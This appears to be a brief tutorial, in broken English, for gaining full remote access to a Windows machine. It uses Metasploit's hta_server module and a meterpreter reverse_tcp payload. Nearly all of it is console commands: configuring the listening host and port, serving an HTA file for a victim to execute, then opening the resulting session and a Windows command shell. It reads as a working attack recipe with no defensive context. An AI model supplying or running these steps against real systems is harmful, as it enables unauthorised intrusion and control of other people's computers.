How make a attack for take total remote access to Windows, using a hta file. Using metasploit.


$ msfconsole


msf6 > use exploit/windows/misc/hta_server

Set the local host and server host to use
msf6 exploit(exploit/windows/misc/hta_server) > set lhost 192.168.43.88
msf6 exploit(exploit/windows/misc/hta_server) > set srvhost 192.168.43.88

Set the payload for reverse shell
msf6 exploit(exploit/windows/misc/hta_server) > set payload windows/meterpreter/reverse_tcp

Set the port to listen
msf6 exploit(exploit/windows/misc/hta_server) > set lport 8111

Verify the configuration
msf6 exploit(exploit/windows/misc/hta_server) > show options

Running
msf6 exploit(exploit/windows/misc/hta_server) > exploit

Now a direction is generated from a server with the hta file to execute in Windows.

------------

When the file is executed a session is open

List of sessions
msf6 exploit(exploit/windows/misc/hta_server) > sessions

Connect to the session
msf6 exploit(exploit/windows/misc/hta_server) > sessions -i 1

Now your is in the Windows machine, execute 'help' for more info or 'shell' for 
get the cmd of Windows.
